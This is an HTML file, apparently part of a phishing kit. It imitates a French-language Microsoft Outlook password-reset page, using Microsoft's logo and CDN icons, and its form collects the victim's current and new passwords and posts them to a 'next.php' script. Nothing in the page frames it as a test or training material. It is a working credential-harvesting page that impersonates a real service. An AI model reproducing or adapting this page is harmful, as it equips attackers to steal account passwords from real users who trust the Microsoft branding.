<html>
    <head>
        <title>Se connecter à Outlook</title>
        <meta charset="utf-8">

        <link rel="stylesheet" href="./style.css">
        <link rel="icon" href="./microsoft.png">
    </head>

    <body>
        <h1 class="title">Outlook</h1>
        <div class="login">
            <img alt="logo" width="100px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png">

            <div class="login-text">
                <div class="login-title">Réinitialiser votre mot de passe</div>
                <div class="continue-to">8 cractères minimum ; différencie majusucules et minuscules</div>
            </div>
            
            <form method="POST" action="next.php">
                <input type="password" placeholder="Ancien mot de passe" name="password" autocomplete="off">
                <input type="password" placeholder="Nouveau mot de passe" name="new_password" autocomplete="off">
                <input type="password" placeholder="Confirmer mot de passe" name="new_password_confirmation" autocomplete="off">

                <p class="continue-to">Aucun compte ? <a href="#">Créez one!</a></p>

                <button type="submit" id="next">Suivant</button>
            </form>
        </div>

        <div class="other">
            <img width="15%" alt="key" src="https://logincdn.msauth.net/shared/5/js/../images/signin_options_4e48046ce74f4b89d450.svg">
            <p>Options de connexion</p>
        </div>
    </body>
</html>